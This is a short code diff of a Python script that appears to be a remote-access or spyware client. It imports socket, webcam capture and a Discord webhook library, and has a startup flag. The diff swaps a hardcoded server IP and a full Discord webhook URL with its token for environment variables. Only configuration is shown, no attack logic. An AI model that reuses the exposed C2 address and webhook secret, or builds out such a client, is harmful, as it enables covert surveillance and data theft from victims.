@@ -10,23 +10,21 @@ import tempfile
 import random
 import discord_webhook
 import cv2
-#from dotenv import load_dotenv
+from dotenv import load_dotenv
 from urllib.request import Request, urlopen
 
 s = socket.socket()
 
-#load_dotenv()
+load_dotenv()
 
 # START OF CONFIG
 
 startup = False
 
-#ip = os.getenv("IP")
-ip = "54.39.98.2"
+ip = os.getenv("IP")
 port = 8080
 
-#WEBHOOK_URL = os.getenv("D_WEBHOOK_URL")
-WEBHOOK_URL = "https://discordapp.com/api/webhooks/1065724710366740520/B-719Ud2Ma-p1Ny6NIjpzj6bQJe45YXfHtZuu7VkDrdpn9_4wkrp84eYAlqMqaudfIr7"
+WEBHOOK_URL = os.getenv("D_WEBHOOK_URL")
 
 PING = True
 
